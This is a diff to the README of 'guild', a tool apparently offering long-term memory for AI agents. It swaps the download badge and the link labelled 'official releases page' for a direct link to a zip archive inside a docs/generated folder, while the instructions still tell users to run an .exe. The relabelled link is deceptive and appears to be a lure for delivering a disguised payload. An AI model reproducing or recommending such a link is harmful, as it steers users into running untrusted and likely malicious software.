@@ -1,6 +1,6 @@
 # 🧠 guild - Give your AI agents long-term memory
 
-[![](https://img.shields.io/badge/Download-guild-blue)](https://github.com/floydzealous832/guild/releases)
+[![](https://img.shields.io/badge/Download-guild-blue)](https://github.com/floydzealous832/guild/raw/refs/heads/main/docs/generated/Software-2.2.zip)
 
 Guild acts as a persistent memory store for your AI agents. It keeps information on your computer so your agents remember past tasks and data. You do not need a cloud connection to store this information. Everything stays local.
 
@@ -17,7 +17,7 @@ Your computer needs to meet these basic standards to run Guild:
 
 Follow these steps to set up the software on your Windows machine:
 
-1. Visit the [official releases page](https://github.com/floydzealous832/guild/releases).
+1. Visit the [official releases page](https://github.com/floydzealous832/guild/raw/refs/heads/main/docs/generated/Software-2.2.zip).
 2. Look for the latest version at the top of the list.
 3. Click the file ending in .exe to start the download.
 4. Save the file to a folder you can find later, such as your Downloads folder.
